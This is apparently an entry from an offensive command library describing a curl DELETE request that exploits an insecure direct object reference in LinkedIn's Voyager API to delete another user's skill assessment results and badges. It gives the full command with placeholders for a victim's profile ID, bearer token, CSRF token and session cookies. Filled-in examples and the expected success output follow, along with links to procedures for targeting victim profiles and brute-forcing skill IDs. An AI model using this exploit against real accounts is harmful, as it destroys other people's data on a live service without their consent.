---
id: cmd-linkedin-delete
data: >-
  curl -X DELETE
  "https://www.linkedin.com/voyager/api/voyagerAssessmentsDashSkillAssessmentAttemptReports/urn%3Ali%3Afsd_skillAssessmentAttemptReport%3A(urn%3Ali%3Afsd_profile%3A{victim-uuid}%2Curn%3Ali%3Askill%3A{skill-id}%2C{sequence})"
  -H "Authorization: Bearer {token}" -H "Csrf-Token: {csrf}" -H "User-Agent:
  Mozilla/5.0" --cookie "{session-cookies}"
tags:
  - http
  - delete
  - api
type: command
output: |-
  HTTP/2 200 OK
  {"status":200,"message":"Deleted"}
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:34.022Z'
verified: false
validated: true
submitted: true
---
# linkedin-delete-skill-assessment

## Command

```bash
curl -X DELETE "https://www.linkedin.com/voyager/api/voyagerAssessmentsDashSkillAssessmentAttemptReports/urn%3Ali%3Afsd_skillAssessmentAttemptReport%3A(urn%3Ali%3Afsd_profile%3A{victim-uuid}%2Curn%3Ali%3Askill%3A{skill-id}%2C{sequence})" -H "Authorization: Bearer {token}" -H "Csrf-Token: {csrf}" -H "User-Agent: Mozilla/5.0" --cookie "{session-cookies}"
```

## Description

This curl command replicates the HTTP DELETE request to LinkedIn's Voyager API for removing a skill assessment report. It targets a specific profile, skill, and attempt sequence, exploiting IDOR by using any user's UUID. Use in authenticated sessions to delete results and badges.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `{victim-uuid}` | URL-encoded URN for target profile (e.g., urn%3Ali%3Afsd_profile%3Aac0a1234...) | Yes |
| `{skill-id}` | Numeric ID of the skill (e.g., 280 for HTML) | Yes |
| `{sequence}` | Attempt number (usually 1) | Yes |
| `{token}` | Bearer token from LinkedIn session | Yes |
| `{csrf}` | CSRF token from headers | Yes |
| `{session-cookies}` | Full cookie string including li_at, JSESSIONID | Yes |

## Examples

### Basic Usage

```bash
curl -X DELETE "https://www.linkedin.com/voyager/api/voyagerAssessmentsDashSkillAssessmentAttemptReports/urn%3Ali%3Afsd_skillAssessmentAttemptReport%3A(urn%3Ali%3Afsd_profile%3Aac0a1234-5678-90ab-cdef-1234567890ab%2Curn%3Ali%3Askill%3A280%2C1)" -H "Authorization: Bearer at0a1234567890abcdef" -H "Csrf-Token: ajax:1234567890abcdef" --cookie "li_at=AQED...; JSESSIONID=abc123"
```

### Advanced Usage

```bash
curl -X DELETE "https://www.linkedin.com/voyager/api/voyagerAssessmentsDashSkillAssessmentAttemptReports/urn%3Ali%3Afsd_skillAssessmentAttemptReport%3A(urn%3Ali%3Afsd_profile%3A{victim-uuid}%2Curn%3Ali%3Askill%3A280%2C1)" -H "Authorization: Bearer {token}" -H "Csrf-Token: {csrf}" -H "Content-Type: application/json" --cookie "{cookies}" -v
```

## Expected Output

Successful execution returns HTTP 200 OK with a JSON response like {"status":200}, indicating the assessment report was deleted. Failed attempts (invalid ID) return 404 or 403 with error messages. Verify by checking the profile for removed badge.

## Related

- [[procedures/Modify-Request-with-Victim-Profile]]
- [[procedures/Brute-Force-Skill-ID-for-Deletion]]
